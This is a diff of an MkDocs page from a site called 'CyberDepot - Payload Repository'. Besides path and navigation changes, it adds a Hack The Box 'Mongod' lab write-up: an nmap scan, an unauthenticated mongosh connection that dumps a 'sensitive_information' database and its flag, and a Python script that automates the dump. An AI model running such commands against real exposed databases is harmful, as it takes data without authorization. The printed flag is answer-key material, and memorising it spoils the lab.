@@ -8,24 +8,26 @@
       
       
       
-        <link rel="canonical" href="https://github.com/InfoSec-DB/CyberDepot/htb/startingpoint/htb_mongod/">
+        <link rel="canonical" href="https://github.com/InfoSec-DB/CyberDepot/htb_mongod/">
+      
+      
+        <link rel="prev" href="../vuln_boelter_blue/">
       
       
       
-      
-      <link rel="icon" href="../../../img/favicon.ico">
+      <link rel="icon" href="../img/favicon.ico">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.8">
     
     
       
-        <title>Htb mongod - CyberDepot - Payload Repository</title>
+        <title>Starting Point - CyberDepot - Payload Repository</title>
       
     
     
-      <link rel="stylesheet" href="../../../assets/stylesheets/main.8608ea7d.min.css">
+      <link rel="stylesheet" href="../assets/stylesheets/main.8608ea7d.min.css">
       
         
-        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
       
       
 
@@ -44,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../css/custom.css">
+      <link rel="stylesheet" href="../css/custom.css">
     
-    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
 
@@ -71,6 +73,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#hack-the-box-mongod-writeup" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -83,9 +90,9 @@
 
 <header class="md-header md-header--shadow" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="CyberDepot - Payload Repository" class="md-header__button md-logo" aria-label="CyberDepot - Payload Repository" data-md-component="logo">
+    <a href=".." title="CyberDepot - Payload Repository" class="md-header__button md-logo" aria-label="CyberDepot - Payload Repository" data-md-component="logo">
       
-  <img src="../../../img/logo.svg" alt="logo">
+  <img src="../img/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -102,7 +109,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Htb mongod
+              Starting Point
             
           </span>
         </div>
@@ -205,9 +212,9 @@
 
 <nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="CyberDepot - Payload Repository" class="md-nav__button md-logo" aria-label="CyberDepot - Payload Repository" data-md-component="logo">
+    <a href=".." title="CyberDepot - Payload Repository" class="md-nav__button md-logo" aria-label="CyberDepot - Payload Repository" data-md-component="logo">
       
-  <img src="../../../img/logo.svg" alt="logo">
+  <img src="../img/logo.svg" alt="logo">
 
     </a>
     CyberDepot - Payload Repository
@@ -234,7 +241,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../.." class="md-nav__link">
+      <a href=".." class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -300,7 +307,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../xsspayloads/" class="md-nav__link">
+      <a href="../xsspayloads/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -329,7 +336,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../passcrack/" class="md-nav__link">
+      <a href="../passcrack/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -350,7 +357,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../googledorks/" class="md-nav__link">
+      <a href="../googledorks/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -416,7 +423,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../shodan/" class="md-nav__link">
+      <a href="../shodan/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -438,7 +445,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../nmap/" class="md-nav__link">
+      <a href="../nmap/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -512,7 +519,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../otpbypass/" class="md-nav__link">
+      <a href="../otpbypass/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -534,7 +541,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../passresetpoison/" class="md-nav__link">
+      <a href="../passresetpoison/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -556,7 +563,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../2fabypasscsrf/" class="md-nav__link">
+      <a href="../2fabypasscsrf/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -630,7 +637,7 @@
   
   
     <li class="md-nav__item">
-      <a href="../../../vuln_boelter_blue/" class="md-nav__link">
+      <a href="../vuln_boelter_blue/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -656,8 +663,10 @@
       
   
   
+    
   
   
+  
     
     
     
@@ -669,13 +678,11 @@
     
       
     
-    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
-          
-        
-        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_8" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" checked>
         
           
           <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="">
@@ -690,7 +697,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="true">
           <label class="md-nav__title" for="__nav_8">
             <span class="md-nav__icon md-icon"></span>
             HTB Writeups
@@ -701,10 +708,31 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="/CyberDepot/htb/startingpoint/htb_mongod.md" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Starting Point
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -714,6 +742,119 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔥 Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#target-enumeration-recon" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 Target Enumeration &amp; Recon
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🎯 Target Enumeration &amp; Recon">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Nmap Scan
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation-unauthenticated-mongodb-access" class="md-nav__link">
+    <span class="md-ellipsis">
+      🚀 Exploitation: Unauthenticated MongoDB Access
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 Exploitation: Unauthenticated MongoDB Access">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2-connecting-to-mongodb" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Connecting to MongoDB
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extracting-the-flag" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 Extracting the Flag
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automating-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔥 Automating the Exploit
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🎯 Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#afterdark-security" class="md-nav__link">
+    <span class="md-ellipsis">
+      💀 AfterDark Security
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -745,9 +886,129 @@
   
 
 
-  <h1>Htb mongod</h1>
-
-
+<h1 id="hack-the-box-mongod-writeup">Hack The Box - Mongod Writeup</h1>
+<p><img alt="HTB Banner" src="https://www.hackthebox.com/badge/image/your-badge-id" /></p>
+<h2 id="overview">🔥 Overview</h2>
+<p><strong>Machine Name:</strong> Mongod<br />
+<strong>Difficulty:</strong> Easy<br />
+<strong>Vulnerability:</strong> MongoDB Misconfiguration<br />
+<strong>Attack Vector:</strong> Unauthenticated Database Access<br />
+<strong>Technology Stack:</strong> MongoDB NoSQL Database (TCP:27017)  </p>
+<hr />
+<h2 id="target-enumeration-recon">🎯 <strong>Target Enumeration &amp; Recon</strong></h2>
+<h3 id="1-nmap-scan"><strong>1️⃣ Nmap Scan</strong></h3>
+<p>We start with an <strong>Nmap</strong> scan to identify open ports and services running on the target machine:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.107.200
+</code></pre></div>
+<p><strong>Results:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>PORT      STATE SERVICE    VERSION
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>27017/tcp open  mongodb    MongoDB 3.6.8
+</code></pre></div>
+MongoDB is running on <strong>port 27017</strong>, and based on the <strong>version (3.6.8)</strong>, it might be <strong>misconfigured</strong>.</p>
+<hr />
+<h2 id="exploitation-unauthenticated-mongodb-access">🚀 <strong>Exploitation: Unauthenticated MongoDB Access</strong></h2>
+<p>MongoDB sometimes allows <strong>unauthenticated access</strong>, meaning we can connect and extract information <strong>without credentials</strong>.</p>
+<h3 id="2-connecting-to-mongodb"><strong>2️⃣ Connecting to MongoDB</strong></h3>
+<p>We use <code>mongosh</code> (MongoDB shell) to check if we have direct access:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>mongosh<span class="w"> </span>mongodb://10.129.107.200:27017
+</code></pre></div>
+<p>If we connect successfully, we can list the available databases:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nx">show</span><span class="w"> </span><span class="nx">dbs</span><span class="p">;</span>
+</code></pre></div>
+<p><strong>Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>admin                  32.00 KiB
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>config                 72.00 KiB
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>local                  72.00 KiB
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>sensitive_information  32.00 KiB
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>users                  32.00 KiB
+</code></pre></div></p>
+<p>The <strong><code>sensitive_information</code></strong> database seems interesting.</p>
+<hr />
+<h2 id="extracting-the-flag">🎯 <strong>Extracting the Flag</strong></h2>
+<p>Let's switch to the <strong>sensitive_information</strong> database and list its collections:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nx">use</span><span class="w"> </span><span class="nx">sensitive_information</span><span class="p">;</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nx">show</span><span class="w"> </span><span class="nx">collections</span><span class="p">;</span>
+</code></pre></div>
+<p><strong>Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>flag
+</code></pre></div></p>
+<p>We extract the data:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nx">db</span><span class="p">.</span><span class="nx">flag</span><span class="p">.</span><span class="nx">find</span><span class="p">();</span>
+</code></pre></div>
+<p><strong>Output:</strong>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="p">[</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="w">  </span><span class="p">{</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="w">    </span><span class="nt">&quot;_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="err">Objec</span><span class="kc">t</span><span class="err">Id(</span><span class="s2">&quot;630e3dbcb82540ebbd1748c5&quot;</span><span class="err">)</span><span class="p">,</span>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1b6e6fb359e7c40241b6d431427ba6ea&quot;</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="w">  </span><span class="p">}</span>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="p">]</span>
+</code></pre></div></p>
+<p>✅ <strong>FLAG FOUND:</strong> <code>1b6e6fb359e7c40241b6d431427ba6ea</code></p>
+<hr />
+<h2 id="automating-the-exploit">🔥 <strong>Automating the Exploit</strong></h2>
+<p>Instead of doing this manually, we created a Python exploit:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">subprocess</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">TARGET_IP</span> <span class="o">=</span> <span class="s2">&quot;10.129.107.200&quot;</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">OUTPUT_FILE</span> <span class="o">=</span> <span class="s2">&quot;mongo_output.json&quot;</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="k">def</span><span class="w"> </span><span class="nf">extract_flag</span><span class="p">():</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] Connecting to MongoDB and extracting flag...&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a>    <span class="n">mongosh_commands</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="s2">    show dbs;</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="s2">    use sensitive_information;</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="s2">    show collections;</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="s2">    db.flag.find();</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="s2">    &quot;&quot;&quot;</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a>        <span class="p">[</span><span class="s2">&quot;mongosh&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;mongodb://</span><span class="si">{</span><span class="n">TARGET_IP</span><span class="si">}</span><span class="s2">:27017&quot;</span><span class="p">,</span> <span class="s2">&quot;--quiet&quot;</span><span class="p">],</span>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a>        <span class="nb">input</span><span class="o">=</span><span class="n">mongosh_commands</span><span class="p">,</span>
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a>        <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span>
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a>    <span class="p">)</span>
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a>
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a>    <span class="n">output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a>    <span class="k">if</span> <span class="ow">not</span> <span class="n">output</span><span class="p">:</span>
+<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] No output received from MongoDB.&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a>        <span class="k">return</span>
+<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>
+<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">OUTPUT_FILE</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+<a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a>        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+<a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>
+<a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a>    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[+] MongoDB output saved to </span><span class="si">{</span><span class="n">OUTPUT_FILE</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a>
+<a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a>    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;flag:\s*&#39;([a-f0-9]+)&#39;&quot;</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
+<a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
+<a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a>        <span class="n">flag</span> <span class="o">=</span> <span class="n">match</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<a id="__codelineno-9-38" name="__codelineno-9-38" href="#__codelineno-9-38"></a>        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[✔] FLAG EXTRACTED: </span><span class="si">{</span><span class="n">flag</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-39" name="__codelineno-9-39" href="#__codelineno-9-39"></a>    <span class="k">else</span><span class="p">:</span>
+<a id="__codelineno-9-40" name="__codelineno-9-40" href="#__codelineno-9-40"></a>        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[-] Flag not found.&quot;</span><span class="p">)</span>
+<a id="__codelineno-9-41" name="__codelineno-9-41" href="#__codelineno-9-41"></a>
+<a id="__codelineno-9-42" name="__codelineno-9-42" href="#__codelineno-9-42"></a><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+<a id="__codelineno-9-43" name="__codelineno-9-43" href="#__codelineno-9-43"></a>    <span class="n">extract_flag</span><span class="p">()</span>
+</code></pre></div>
+<p>Save this script as <code>mongo_pwn.py</code> and run:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>python3<span class="w"> </span>mongo_pwn.py
+</code></pre></div>
+<hr />
+<h2 id="conclusion">🎯 <strong>Conclusion</strong></h2>
+<p>This box demonstrates the <strong>importance of securing MongoDB</strong> against unauthenticated access. The key takeaways:</p>
+<ul>
+<li>Always <strong>require authentication</strong> for databases.</li>
+<li><strong>Disable remote access</strong> if not needed.</li>
+<li><strong>Upgrade MongoDB</strong> to prevent known exploits.</li>
+</ul>
+<p>✅ <strong>Mission Accomplished!</strong> 🎉</p>
+<hr />
+<h2 id="afterdark-security">💀 <strong>AfterDark Security</strong></h2>
+<p>Follow <strong>#AfterDark</strong> for more <strong>CTF solutions, pentesting tricks, and cybersecurity research!</strong><br />
+🚀 <strong>GitHub:</strong> [Your Repo Link]<br />
+🐦 <strong>Twitter:</strong> [Your Twitter Handle]  </p>
+<hr />
 
 
 
@@ -846,12 +1107,12 @@
       <div class="md-progress" data-md-component="progress" role="progressbar"></div>
     
     
-    <script id="__config" type="application/json">{"base": "../../..", "features": ["toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy", "navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.expand", "navigation.prune", "toc.follow", "navigation.top", "header.autohide"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy", "navigation.instant", "navigation.instant.progress", "navigation.sections", "navigation.expand", "navigation.prune", "toc.follow", "navigation.top", "header.autohide"], "search": "../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
-      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      <script src="../assets/javascripts/bundle.c8b220af.min.js"></script>
       
-        <script src="../../../js/custom.js"></script>
+        <script src="../js/custom.js"></script>
       
     
   </body>
